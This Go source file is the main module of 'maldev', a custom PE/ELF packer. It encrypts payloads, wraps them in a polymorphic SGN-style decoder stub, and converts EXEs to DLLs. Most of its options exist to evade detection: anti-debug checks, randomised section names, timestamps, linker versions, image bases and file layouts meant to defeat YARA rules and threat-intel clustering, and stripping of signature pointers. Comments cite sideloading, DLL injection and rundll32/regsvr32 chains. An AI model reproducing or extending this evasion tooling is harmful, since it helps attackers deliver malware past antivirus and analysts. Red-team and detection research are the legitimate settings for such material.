// Package packer is maldev's custom PE/ELF packer.
//
// [Pack] / [Unpack] handle the encrypt-only pipeline (Phase 1c+).
// [PackBinary] is the operator-facing entry point added in Phase 1e (v0.61.x):
// it wraps a payload in a runnable host binary (Windows PE32+ via
// [FormatWindowsExe] or Linux ELF64 static-PIE via [FormatLinuxELF])
// containing a polymorphic SGN-style stage-1 decoder and a reflective
// stage-2 loader. No go build or system toolchain is required at pack time.
//
// Design + roadmap: docs/refactor-2026-doc/packer-design.md.
package packer

import (
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/oioio-space/maldev/crypto"
	"github.com/oioio-space/maldev/pe/packer/internal/elfgate"
	"github.com/oioio-space/maldev/pe/packer/stubgen"
	"github.com/oioio-space/maldev/pe/packer/transform"
	"github.com/oioio-space/maldev/random"
)

// Options tunes [Pack]. The zero value selects sensible defaults
// (AES-GCM, no compression, freshly-generated key).
type Options struct {
	// Cipher selects the AEAD primitive. Only [CipherAESGCM] is
	// implemented today; [CipherChaCha20] and [CipherRC4] are
	// reserved constants and return [ErrUnsupportedCipher].
	Cipher Cipher

	// Compressor selects the compression pass run BEFORE
	// encryption. Only [CompressorNone] is implemented today;
	// other constants return [ErrUnsupportedCompressor].
	Compressor Compressor

	// Key, when non-nil, is the AEAD key. When nil, [Pack]
	// generates 32 random bytes via crypto.NewAESKey and
	// returns them as the second return value.
	Key []byte
}

// Pack runs `data` through the configured AEAD cipher and emits
// a [Magic]-prefixed blob.
//
// Returns the packed bytes + the AEAD key used (caller-supplied
// or freshly generated). The returned key is the only material
// needed to call [Unpack] later; the blob itself is opaque.
func Pack(data []byte, opts Options) (packed []byte, key []byte, err error) {
	if opts.Cipher != CipherAESGCM {
		return nil, nil, fmt.Errorf("%w: %s", ErrUnsupportedCipher, opts.Cipher)
	}
	if opts.Compressor != CompressorNone {
		return nil, nil, fmt.Errorf("%w: %s", ErrUnsupportedCompressor, opts.Compressor)
	}

	key = opts.Key
	if key == nil {
		key, err = crypto.NewAESKey()
		if err != nil {
			return nil, nil, fmt.Errorf("packer: generate key: %w", err)
		}
	}

	body, err := crypto.EncryptAESGCM(key, data)
	if err != nil {
		return nil, nil, fmt.Errorf("packer: encrypt: %w", err)
	}

	out := make([]byte, HeaderSize+len(body))
	(&header{
		Magic:       Magic,
		Version:     FormatVersion,
		Cipher:      uint8(opts.Cipher),
		Compressor:  uint8(opts.Compressor),
		OrigSize:    uint64(len(data)),
		PayloadSize: uint64(len(body)),
	}).marshalInto(out)
	copy(out[HeaderSize:], body)
	return out, key, nil
}

// Format selects the host binary shape PackBinary emits.
type Format uint8

const (
	FormatUnknown    Format = iota // zero value; rejected by PackBinary
	FormatWindowsExe               // Phase 1e (v0.61.x): PE32+ Windows executable
	FormatLinuxELF                 // Phase 1e (v0.61.x): ELF64 Linux static-PIE
	// FormatWindowsDLL — Phase 2-F-3-c follow-up (scoped in
	// docs/refactor-2026-doc/packer-dll-format-plan.md). The
	// Format constant is wired through here so PlanPE's DLL
	// rejection can route to the correct error message, but
	// the actual DLL stub implementation is a separate slice.
	// Selecting this format today still produces ErrIsDLL until
	// the stub work lands.
	FormatWindowsDLL
)

// String returns the canonical lowercase format name.
func (f Format) String() string {
	switch f {
	case FormatWindowsExe:
		return "windows-exe"
	case FormatLinuxELF:
		return "linux-elf"
	case FormatWindowsDLL:
		return "windows-dll"
	default:
		return fmt.Sprintf("format(%d)", uint8(f))
	}
}

// PackBinaryOptions parameterizes [PackBinary].
type PackBinaryOptions struct {
	// Format, when non-zero, is cross-checked against the magic bytes of
	// the input. FormatUnknown (zero) skips the cross-check and relies on
	// auto-detection.
	Format Format

	// Stage1Rounds is the number of SGN encoding rounds applied to the
	// encrypted .text section. Defaults to 3 when zero. Valid range: 1..10.
	Stage1Rounds int

	// Seed drives the poly engine. Zero means crypto-random.
	Seed int64

	// Key, when non-nil, is used as the XOR key for .text encryption.
	// When nil a fresh 32-byte key is generated.
	Key []byte

	// AntiDebug, when true, prepends a ~70-byte anti-debug prologue to the
	// Windows PE stub: three checks (PEB.BeingDebugged, PEB.NtGlobalFlag
	// mask 0x70, RDTSC delta around CPUID with threshold 1000 cycles).
	// Positive detection exits via RET — ntdll!RtlUserThreadStart's epilogue
	// calls ExitProcess(0), so the process exits cleanly without revealing
	// any SGN-decoded bytes. Default false (conservative). ELF stubs ignore
	// this flag.
	AntiDebug bool

	// Compress, when true, LZ4-compresses the .text section before SGN
	// encoding. The stub gains a 22-byte register-setup sequence plus the
	// 136-byte LZ4 block inflate decoder between the last SGN round and the
	// OEP JMP. Typical size reduction: 40–60 % for Go binaries. The packed
	// binary is self-contained — no external decompressor is needed at
	// runtime. Default false (conservative). See [stubgen.Options.Compress]
	// for the full in-place inflate layout.
	Compress bool

	// ConvertEXEtoDLL, when true, converts a PE32+ EXE input into a
	// PE32+ DLL output at pack time. Mutually exclusive with
	// FormatWindowsDLL. Rejected with [ErrUnsupportedFormat] when
	// the input isn't a PE32+ EXE.
	//
	// Operationally unlocks sideloading (drop the converted DLL
	// next to a signed legit EXE that LoadLibrary's it), classic
	// DLL injection, and LOLBAS rundll32 / regsvr32 chains.
	//
	// Slice 5 of docs/refactor-2026-doc/packer-exe-to-dll-plan.md.
	ConvertEXEtoDLL bool

	// DiagSkipConvertedPayload is a slice-5.5.y diagnostic flag.
	// When true alongside ConvertEXEtoDLL, the converted-DLL stub
	// omits SGN rounds + kernel32-resolver + CreateThread call —
	// emits only prologue + flag latch + return TRUE. Used to
	// bisect which stage causes ERROR_DLL_INIT_FAILED at LoadLibrary
	// time. Production code MUST leave this false.
	DiagSkipConvertedPayload bool

	// DiagSkipConvertedResolver and DiagSkipConvertedSpawn are the
	// finer-grained slice-5.5.y bisection flags forwarded to
	// [stubgen.Options]. Production code MUST leave both false.
	DiagSkipConvertedResolver bool
	DiagSkipConvertedSpawn    bool

	// ConvertEXEtoDLLDefaultArgs bakes a default command-line into
	// the converted-DLL stub. Ignored when ConvertEXEtoDLL is false.
	// Empty string preserves the prior behaviour where the payload
	// inherits the host process's GetCommandLineW result. See
	// [stubgen.Options.ConvertEXEtoDLLDefaultArgs] for the OPSEC
	// trade-off (the patch is permanent for the host process).
	ConvertEXEtoDLLDefaultArgs string

	// ConvertEXEtoDLLRunWithArgs, when true alongside ConvertEXEtoDLL,
	// adds a `RunWithArgs(LPCWSTR args)` exported function to the
	// emitted DLL. The operator invokes it via GetProcAddress +
	// indirect call to spawn the payload with a fresh command-line
	// at any time after LoadLibrary, independent of any pack-time
	// [ConvertEXEtoDLLDefaultArgs] baked into DllMain.
	//
	// The export takes one wide-char string parameter (UTF-16LE,
	// NUL-terminated) and returns a DWORD — the OEP thread's exit
	// code from GetExitCodeThread after WaitForSingleObject. The
	// stub rewrites PEB.ProcessParameters.CommandLine in place,
	// spawns a thread on the OEP, waits for completion, and
	// returns the exit code.
	//
	// Adds a single named export to the DLL (one extra IOC). Off
	// by default — only enable when the operator needs the runtime
	// entry. ConvertEXEtoDLLDefaultArgs and ConvertEXEtoDLLRunWithArgs
	// are independent; both, either, or neither may be set.
	ConvertEXEtoDLLRunWithArgs bool

	// RandomizeStubSectionName, when true, names the appended PE
	// stub section with a fresh per-pack random label
	// (`.xxxxx\x00\x00`) instead of the hardcoded ".mldv". Defeats
	// YARA rules keyed on the literal default name. Default false
	// (conservative — packs reproducibly across runs).
	//
	// Phase 2-A of docs/refactor-2026-doc/packer-design.md.
	// PE only; ELF section names live in `.shstrtab` and aren't
	// load-relevant.
	RandomizeStubSectionName bool

	// RandomizeTimestamp, when true, overwrites the COFF File
	// Header's TimeDateStamp with a random epoch in the
	// `[now-5y, now]` window. Defeats temporal clustering by
	// threat-intel pivots that group samples by linker timestamp.
	// Per-pack uniqueness comes from a fresh-seeded RNG (seeded
	// from opts.Seed when non-zero, else crypto-random).
	//
	// Phase 2-B of docs/refactor-2026-doc/packer-design.md.
	// PE only — ELF doesn't carry an analogous build-timestamp
	// field the loader respects.
	RandomizeTimestamp bool

	// RandomizeLinkerVersion, when true, overwrites the Optional
	// Header's MajorLinkerVersion + MinorLinkerVersion bytes with
	// a random plausible MSVC pair (major ∈ [12, 15], minor ∈
	// [0, 99]). Defeats threat-intel pivots that cluster samples
	// by linker version ("all samples linked with VS2017 14.16").
	// Per-pack uniqueness comes from a fresh-seeded RNG.
	//
	// Phase 2-C of docs/refactor-2026-doc/packer-design.md.
	// PE only — ELF carries no analogous field.
	RandomizeLinkerVersion bool

	// RandomizeImageVersion, when true, overwrites the Optional
	// Header's MajorImageVersion + MinorImageVersion uint16
	// fields with a plausible "small in-house project" pair
	// (major ∈ [0, 9], minor ∈ [0, 99]). Defeats threat-intel
	// pivots that cluster samples by per-binary version stamp.
	// Per-pack uniqueness via fresh-seeded RNG.
	//
	// Phase 2-D of docs/refactor-2026-doc/packer-design.md.
	// PE only.
	RandomizeImageVersion bool

	// RandomizeExistingSectionNames, when true, overwrites every
	// section header's 8-byte Name slot with a fresh ".xxxxx\x00\x00"
	// label before the stub is appended. Section data, VAs, raw
	// offsets, sizes, characteristics, the DataDirectory, and the
	// relocation table are all untouched — Windows finds resources,
	// imports, exports, relocations via the Optional Header
	// DataDirectory (RVA-based), so renaming `.text` → `.xkqwz`
	// doesn't break the loader contract. Defeats name-pattern
	// heuristics ("section called .text is RWX — suspicious") and
	// YARA rules keyed on the host binary's original section labels.
	// Composes with RandomizeStubSectionName: the stub section is
	// appended *after* this rename so its name is controlled by
	// that flag.
	//
	// Phase 2-F-1 of docs/refactor-2026-doc/packer-design.md.
	// PE only.
	RandomizeExistingSectionNames bool

	// RandomizeJunkSections, when true, inserts a per-pack random
	// number of zero-byte "separator" sections between the host
	// PE's last existing section and the appended packer stub.
	// Each separator is uninitialised data (SizeOfRawData=0,
	// PointerToRawData=0, IMAGE_SCN_CNT_UNINITIALIZED_DATA |
	// IMAGE_SCN_MEM_READ) so the file size doesn't grow — only
	// SizeOfImage (the loader's RAM map) and NumberOfSections do.
	// Separators get random `.xxxxx` names; the stub's declared
	// VirtualAddress and OEP shift forward by count*SectionAlignment.
	//
	// Per-pack count drawn from [1, 5] using a fresh-seeded RNG
	// (deterministic given opts.Seed).
	//
	// Phase 2-F-2 of docs/refactor-2026-doc/packer-design.md.
	// Defeats heuristics keyed on "9 sections" or "stub is the
	// last header" patterns. PE only.
	RandomizeJunkSections bool

	// RandomizePEFileOrder, when true, permutes the FILE order of
	// host PE section bodies (not their VAs). PE/COFF allows the
	// file layout of section bodies to be in any order with
	// arbitrary FileAlignment-padded gaps; the loader maps each
	// section by its PointerToRawData / SizeOfRawData fields, not
	// by file ordering. So permuting the file order changes every
	// section body's on-disk offset without touching the runtime
	// image: VAs, relocations, the DataDirectory, OEP, and the
	// stub's RIP-relative addressing all stay byte-identical to a
	// vanilla pack.
	//
	// Defeats YARA rules anchored at file offsets ("file offset
	// 0x400 contains the decryption key bytes") with zero
	// loader-contract risk.
	//
	// The appended packer stub is exempt from the permutation
	// (skipLast=1), so the stub's file offset stays predictable
	// for any future stub-introspection work.
	//
	// Phase 2-F-3-b of docs/refactor-2026-doc/packer-design.md.
	// PE only.
	RandomizePEFileOrder bool

	// RandomizeImageBase, when true, overwrites the PE32+ Optional
	// Header's ImageBase (uint64 at +0x18) with a fresh random
	// value drawn from the canonical user-mode EXE range
	// `[0x140000000, 0x7FF000000000)` snapped to 64 KiB. Under
	// ASLR (which Go binaries enable by default via DYNAMIC_BASE),
	// the loader picks the actual load address regardless of this
	// value — so the only observable effect is a different
	// preferred-base byte sequence in the file image. Defeats
	// heuristics on canonical preferred-base values like the Go
	// linker's 0x140000000 default ("file's ImageBase = 0x140000000
	// → likely Go binary").
	//
	// Phase 2-F-3-c (lite) of docs/refactor-2026-doc/packer-design.md.
	// PE only.
	RandomizeImageBase bool

	// RandomizeImageVAShift, when true, shifts every section's
	// VirtualAddress forward by a random delta D = N×SectionAlignment
	// (N drawn from [1, 8] per pack, so D ∈ [4 KiB, 32 KiB] for the
	// PE32+ default 4 KiB SectionAlignment). The shift fixes up the
	// reloc table's absolute pointer values + each block's PageRVA,
	// every non-zero DataDirectory entry's RVA, the OEP, and
	// SizeOfImage. Section data is NOT moved — only metadata.
	//
	// Inter-section deltas are preserved, so RIP-relative
	// references between sections (which the linker bakes as raw
	// 32-bit displacements outside the reloc table) keep working
	// without re-encoding. This includes the SGN stub's reach into
	// .text, the central reason this transform exists in this
	// shape rather than per-section permutation.
	//
	// Defeats heuristics anchored at canonical VAs (".text starts
	// at VA 0x1000", "OEP is at 0x140001000"). Returns
	// [transform.ErrRelocsStripped] when the input PE has the
	// IMAGE_FILE_RELOCS_STRIPPED Characteristics bit set — such
	// images carry no relocation metadata and can't be safely
	// shifted; opt out for those binaries.
	//
	// Phase 2-F-3-c of docs/refactor-2026-doc/packer-design.md.
	// PE only.
	RandomizeImageVAShift bool

	// RandomizeAll, when true, ORs every individual Randomize*
	// flag above to true: stub section name, TimeDateStamp,
	// LinkerVersion, ImageVersion, existing section names. The
	// individual flags can still selectively turn additional
	// behaviour on; this is the "everything Phase 2 ships today"
	// shortcut.
	//
	// Phase 2-E of docs/refactor-2026-doc/packer-design.md.
	// PE only — opt-ins under the hood are PE-specific.
	RandomizeAll bool
}

// ErrUnsupportedFormat fires when [PackBinary]'s opts.Format does not
// match the magic-detected format of the input binary.
var ErrUnsupportedFormat = errors.New("packer: unsupported format")

// PackBinary applies the UPX-style transform to a PE/ELF input binary:
// encrypts .text, appends a polymorphic decoder stub as a new section,
// rewrites the entry point. At runtime the kernel loads the modified
// binary normally; the stub decrypts .text and JMPs to the original OEP.
//
// Pure Go: no go build, no system toolchain at pack-time.
//
// Sentinels: [ErrUnsupportedFormat], [stubgen.ErrInvalidRounds],
// [stubgen.ErrNoInput], plus transform sentinels
// (ErrNoTextSection, ErrOEPOutsideText, ErrTLSCallbacks, …).
func PackBinary(input []byte, opts PackBinaryOptions) ([]byte, []byte, error) {
	if err := validatePackBinaryInput(opts, input); err != nil {
		return nil, nil, err
	}

	rounds := opts.Stage1Rounds
	if rounds == 0 {
		rounds = 3
	}

	// Phase 2-E: RandomizeAll fans out to every individual opt-in.
	// OR-style so an operator who sets both RandomizeAll AND a
	// specific flag still gets the expected behaviour.
	if opts.RandomizeAll {
		opts.RandomizeStubSectionName = true
		opts.RandomizeTimestamp = true
		opts.RandomizeLinkerVersion = true
		opts.RandomizeImageVersion = true
		opts.RandomizeExistingSectionNames = true
		opts.RandomizeJunkSections = true
		opts.RandomizePEFileOrder = true
		opts.RandomizeImageVAShift = true
		opts.RandomizeImageBase = true
	}

	// Resolve the master seed once. When opts.Seed==0 and any
	// randomiser is enabled, draw a fresh crypto seed; otherwise
	// each opt-block would have its own /dev/urandom round-trip.
	// Per-randomiser independence comes from a per-call seed
	// offset (see seedOffset* constants) feeding distinct
	// math/rand streams.
	masterSeed := opts.Seed
	anyRandomize := opts.RandomizeStubSectionName || opts.RandomizeTimestamp ||
		opts.RandomizeLinkerVersion || opts.RandomizeImageVersion ||
		opts.RandomizeExistingSectionNames || opts.RandomizeJunkSections ||
		opts.RandomizePEFileOrder || opts.RandomizeImageBase ||
		opts.RandomizeImageVAShift
	if anyRandomize && masterSeed == 0 {
		s, err := random.Int64()
		if err != nil {
			return nil, nil, fmt.Errorf("packer: random master seed: %w", err)
		}
		masterSeed = s
	}

	// Phase 2-A: per-pack random stub section name. Default zero
	// value preserves the canonical ".mldv\x00\x00\x00" — packs
	// stay byte-reproducible unless the operator opts in.
	var stubSectionName [8]byte
	if opts.RandomizeStubSectionName {
		stubSectionName = transform.RandomStubSectionName(rand.New(rand.NewSource(masterSeed + seedOffsetStubName)))
	}

	out, key, err := stubgen.Generate(stubgen.Options{
		Input:           input,
		Rounds:          rounds,
		Seed:            opts.Seed,
		CipherKey:       opts.Key,
		AntiDebug:       opts.AntiDebug,
		Compress:        opts.Compress,
		StubSectionName: stubSectionName,
		ConvertEXEtoDLL:            opts.ConvertEXEtoDLL,
		DiagSkipConvertedPayload:   opts.DiagSkipConvertedPayload,
		DiagSkipConvertedResolver:  opts.DiagSkipConvertedResolver,
		DiagSkipConvertedSpawn:     opts.DiagSkipConvertedSpawn,
		ConvertEXEtoDLLDefaultArgs: opts.ConvertEXEtoDLLDefaultArgs,
		ConvertEXEtoDLLRunWithArgs: opts.ConvertEXEtoDLLRunWithArgs,
		// StubMaxSize zero: stubgen.Generate picks 8192 (Compress=true) or
		// 4096 (Compress=false) based on the Compress flag.
	})
	if err != nil {
		return nil, nil, err
	}

	// All Phase 2-B/C/D/F-1 patches are PE-only; cache the format
	// detection rather than re-walking the buffer per opt-block.
	isPE := transform.DetectFormat(out) == transform.FormatPE

	// Phase 2-B: per-pack random TimeDateStamp.
	if opts.RandomizeTimestamp && isPE {
		ts := transform.RandomTimeDateStamp(
			rand.New(rand.NewSource(masterSeed+seedOffsetTimestamp)),
			uint32(time.Now().Unix()))
		if perr := transform.PatchPETimeDateStamp(out, ts); perr != nil {
			return nil, nil, fmt.Errorf("packer: patch timestamp: %w", perr)
		}
	}

	// Phase 2-C: per-pack random LinkerVersion.
	if opts.RandomizeLinkerVersion && isPE {
		major, minor := transform.RandomLinkerVersion(rand.New(rand.NewSource(masterSeed + seedOffsetLinkerVersion)))
		if perr := transform.PatchPELinkerVersion(out, major, minor); perr != nil {
			return nil, nil, fmt.Errorf("packer: patch linker version: %w", perr)
		}
	}

	// Phase 2-D: per-pack random ImageVersion.
	if opts.RandomizeImageVersion && isPE {
		major, minor := transform.RandomImageVersion(rand.New(rand.NewSource(masterSeed + seedOffsetImageVersion)))
		if perr := transform.PatchPEImageVersion(out, major, minor); perr != nil {
			return nil, nil, fmt.Errorf("packer: patch image version: %w", perr)
		}
	}

	// Phase 2-F-1: per-pack rename of every existing PE section
	// header (.text, .rdata, .data, …). Skip the LAST section
	// (appended stub) so its name stays under
	// RandomizeStubSectionName / the canonical ".mldv". Pure
	// header mutation — Windows finds resources / imports /
	// exports / relocs via the Optional Header DataDirectory, so
	// the loader contract is untouched.
	//
	// Must run AFTER stubgen.Generate: PlanPE locates the text
	// section by the literal ".text" name, so renaming before
	// stubgen would defeat planning.
	if opts.RandomizeExistingSectionNames && isPE {
		if perr := transform.RandomizeExistingSectionNames(
			out,
			rand.New(rand.NewSource(masterSeed+seedOffsetExistingSectionNames)),
			1, // skip the appended stub
		); perr != nil {
			return nil, nil, fmt.Errorf("packer: rename existing sections: %w", perr)
		}
	}

	// Phase 2-F-2: insert a per-pack random number of zero-byte
	// separator sections between the host's last existing section
	// and the appended stub. Bumps NumberOfSections + SizeOfImage
	// + the stub's declared VA (and OEP follows). File size
	// unchanged — separators are uninitialised (BSS-style).
	//
	// Run AFTER the section-name rename so the rename pass sees
	// the pre-insert section count and only renames host sections.
	if opts.RandomizeJunkSections && isPE {
		rng := rand.New(rand.NewSource(masterSeed + seedOffsetJunkSections))
		// Per-pack count drawn from [1, 5] — enough to defeat
		// "exact section count" heuristics without bloating the
		// section table or risking SizeOfHeaders overflow.
		count := 1 + rng.Intn(5)
		newOut, perr := transform.AppendJunkSeparators(out, count, rng)
		if perr != nil {
			return nil, nil, fmt.Errorf("packer: insert junk separators: %w", perr)
		}
		out = newOut
	}

	// Phase 2-F-3-b: permute the FILE order of host section
	// bodies. Last to run because we want every prior phase's
	// header mutations (names, separators, etc.) reflected in
	// the section table BEFORE we shuffle the file layout —
	// otherwise a later phase would clobber the new file
	// offsets we just wrote.
	if opts.RandomizePEFileOrder && isPE {
		rng := rand.New(rand.NewSource(masterSeed + seedOffsetPEFileOrder))
		newOut, perr := transform.PermuteSectionFileOrder(out, rng, 1)
		if perr != nil {
			return nil, nil, fmt.Errorf("packer: permute file order: %w", perr)
		}
		out = newOut
	}

	// Phase 2-F-3-c (lite): randomise the PE32+ ImageBase field.
	// Under ASLR this changes only the preferred-base bytes in
	// the file image — runtime mapping is loader-decided. Cheap
	// way to defeat fingerprints on the standard 0x140000000
	// Go-linker default.
	if opts.RandomizeImageBase && isPE {
		rng := rand.New(rand.NewSource(masterSeed + seedOffsetImageBase))
		base := transform.RandomImageBase64(rng)
		// PatchPEImageBase rejects PEs without DYNAMIC_BASE
		// (would crash the loader). Quietly skip rather than
		// fail the whole pack — operators expect RandomizeAll
		// to be best-effort across heterogeneous payloads.
		if perr := transform.PatchPEImageBase(out, base); perr != nil &&
			!strings.Contains(perr.Error(), "DYNAMIC_BASE") {
			return nil, nil, fmt.Errorf("packer: patch image base: %w", perr)
		}
	}

	// Phase 2-F-3-c: shift the entire image's VA layout forward
	// by a random delta. Inter-section deltas preserved (so
	// RIP-relative refs survive without disassembly + re-encoding);
	// only the reloc table, DataDirectory, OEP, and SizeOfImage
	// are touched.
	if opts.RandomizeImageVAShift && isPE {
		rng := rand.New(rand.NewSource(masterSeed + seedOffsetImageVAShift))
		// Per-pack delta drawn from [1, 8] strides of SectionAlignment.
		// Need to peek the alignment from the buffer; PE32+ default
		// is 0x1000 which gives ranges [4 KiB, 32 KiB] — enough to
		// move every VA off canonical addresses without risking
		// uint32 overflow on small ImageBase fixtures.
		strides := uint32(1 + rng.Intn(8))
		// Read SectionAlignment from the optional header without a
		// full parsePELayout call (we already trust isPE). Locate the
		// PE header via e_lfanew.
		peOff := binary.LittleEndian.Uint32(out[transform.PEELfanewOffset:])
		coffOff := peOff + transform.PESignatureSize
		optOff := coffOff + transform.PECOFFHdrSize
		sectionAlign := binary.LittleEndian.Uint32(out[optOff+transform.OptSectionAlignOffset:])
		delta := strides * sectionAlign
		newOut, perr := transform.ShiftImageVA(out, delta)
		if perr != nil {
			return nil, nil, fmt.Errorf("packer: shift image VA by 0x%x: %w", delta, perr)
		}
		out = newOut
	}

	// Always strip DataDirectory[SECURITY] on PE outputs. The
	// .text mutation invalidates any Authenticode signature
	// regardless; carrying a stale cert pointer makes the file
	// look "signed-but-tampered" (loud OPSEC signal). Zeroing
	// the pointer renders it cleanly "unsigned".
	if isPE {
		if perr := transform.StripPESecurityDirectory(out); perr != nil {
			return nil, nil, fmt.Errorf("packer: strip security directory: %w", perr)
		}
	}

	return out, key, nil
}

// validatePackBinaryInput runs every admission cross-check
// [PackBinary] applies before the expensive planning pass: format
// magic, PE EXE-vs-DLL sub-variant, and the ConvertEXEtoDLL
// preconditions. Pulled out of the call site so the matrix of
// opt × input shape rules lives in one place.
//
// One `transform.IsDLL(input)` call per invocation; the result is
// reused across every PE sub-variant check.
func validatePackBinaryInput(opts PackBinaryOptions, input []byte) error {
	detected := transform.DetectFormat(input)
	var isDLL bool
	if detected == transform.FormatPE {
		isDLL = transform.IsDLL(input)
	}

	if opts.Format != FormatUnknown {
		expected := transformFormatFor(opts.Format)
		if detected != expected {
			return fmt.Errorf("%w: opts.Format=%s but input is %s",
				ErrUnsupportedFormat, opts.Format, detected)
		}
		// EXE vs DLL share the FormatPE byte signature; the IsDLL bit
		// disambiguates the two PE sub-variants.
		switch {
		case opts.Format == FormatWindowsDLL && !isDLL:
			return fmt.Errorf("%w: opts.Format=%s but input lacks IMAGE_FILE_DLL",
				ErrUnsupportedFormat, opts.Format)
		case opts.Format == FormatWindowsExe && isDLL:
			return fmt.Errorf("%w: opts.Format=%s but input is a DLL",
				ErrUnsupportedFormat, opts.Format)
		}
	}

	if opts.ConvertEXEtoDLL {
		if opts.Format == FormatWindowsDLL {
			return fmt.Errorf("%w: ConvertEXEtoDLL is mutually exclusive with Format=FormatWindowsDLL",
				ErrUnsupportedFormat)
		}
		if detected != transform.FormatPE {
			return fmt.Errorf("%w: ConvertEXEtoDLL requires a PE32+ EXE input",
				ErrUnsupportedFormat)
		}
		if isDLL {
			return fmt.Errorf("%w: ConvertEXEtoDLL requires an EXE input but got a DLL",
				ErrUnsupportedFormat)
		}
		// Bound DefaultArgs at pack time. Stub max is 4 KiB
		// (Compress=false) or 8 KiB (Compress=true); the stub asm
		// itself is ~600 B + LZ4-inflated payload tail, so leave
		// headroom. This catches "obvious" oversizing with a clear
		// error before stubgen.Generate emits an opaque
		// transform.ErrStubTooLarge.
		if n := len(opts.ConvertEXEtoDLLDefaultArgs); n > maxConvertEXEtoDLLDefaultArgsRunes {
			return fmt.Errorf("%w: ConvertEXEtoDLLDefaultArgs is %d chars; max is %d (would not fit in stub)",
				ErrUnsupportedFormat, n, maxConvertEXEtoDLLDefaultArgsRunes)
		}
	}

	return nil
}

// maxConvertEXEtoDLLDefaultArgsRunes caps DefaultArgs at pack time
// so the stub-fitting failure surfaces with a readable error rather
// than as transform.ErrStubTooLarge from deep inside stubgen. Bound
// chosen to leave room in both the 4 KiB (no-Compress) and 8 KiB
// (Compress) stub budgets after subtracting ~600 B of asm, the
// payload tail, and the trailing data overhead. Operators wanting
// huge default cmdlines should re-think — most Windows loaders cap
// CommandLine at hundreds of bytes.
const maxConvertEXEtoDLLDefaultArgsRunes = 1500

// Per-randomiser seed offsets keep each opt-block's math/rand
// stream independent when multiple Randomize* flags fire on the
// same opts.Seed. Without this, two opts would derive from the
// same stream and feel correlated to a hunter sampling outputs.
const (
	seedOffsetStubName              int64 = 0
	seedOffsetTimestamp             int64 = 0 // distinct domain (epoch) so collision with stubName is harmless
	seedOffsetLinkerVersion         int64 = 1
	seedOffsetImageVersion          int64 = 2
	seedOffsetExistingSectionNames  int64 = 3
	seedOffsetJunkSections          int64 = 4
	seedOffsetPEFileOrder           int64 = 5
	seedOffsetImageVAShift          int64 = 6
	seedOffsetImageBase             int64 = 7
)

// transformFormatFor maps the operator-facing packer.Format to the
// transform package's internal Format constant.
func transformFormatFor(f Format) transform.Format {
	switch f {
	case FormatWindowsExe, FormatWindowsDLL:
		// Both flow through the PE detector at the byte level.
		// The DLL-specific dispatch happens deeper in PlanPE
		// (IMAGE_FILE_DLL bit check) and stubgen (DLL stub
		// emission, planned in packer-dll-format-plan.md).
		return transform.FormatPE
	case FormatLinuxELF:
		return transform.FormatELF
	default:
		return transform.FormatUnknown
	}
}

// ValidateELF returns nil when elf is a Go static-PIE binary
// the Linux runtime can load, or an error explaining the
// rejection reason. Operators should call this at pack time to
// catch unsupported inputs before deploy.
//
// Thin wrapper around elfgate.CheckELFLoadable; lives on the
// packer package so CLI / SDK callers don't need to import an
// internal sub-package.
func ValidateELF(elf []byte) error {
	return elfgate.CheckELFLoadable(elf)
}

// Unpack reverses [Pack] given the original AEAD key. Returns
// the original `data` bytes the caller passed to [Pack].
//
// Sentinels: [ErrBadMagic], [ErrShortBlob], [ErrUnsupportedVersion],
// [ErrUnsupportedCipher], [ErrUnsupportedCompressor],
// [ErrPayloadSizeMismatch], plus the AEAD's own decryption
// errors when the key is wrong or the ciphertext was tampered
// with.
func Unpack(packed, key []byte) ([]byte, error) {
	h, err := unmarshalHeader(packed)
	if err != nil {
		return nil, err
	}
	body := packed[HeaderSize:]
	if uint64(len(body)) != h.PayloadSize {
		return nil, fmt.Errorf("%w: header says %d, body is %d",
			ErrPayloadSizeMismatch, h.PayloadSize, len(body))
	}
	if Cipher(h.Cipher) != CipherAESGCM {
		return nil, fmt.Errorf("%w: %s", ErrUnsupportedCipher, Cipher(h.Cipher))
	}
	if Compressor(h.Compressor) != CompressorNone {
		return nil, fmt.Errorf("%w: %s", ErrUnsupportedCompressor, Compressor(h.Compressor))
	}

	plaintext, err := crypto.DecryptAESGCM(key, body)
	if err != nil {
		return nil, fmt.Errorf("packer: decrypt: %w", err)
	}
	if uint64(len(plaintext)) != h.OrigSize {
		// Defensive: if the header lies about original size,
		// surface it rather than silently returning a different
		// number of bytes than the operator expects.
		return nil, fmt.Errorf("packer: decrypted %d bytes, header says %d",
			len(plaintext), h.OrigSize)
	}
	return plaintext, nil
}
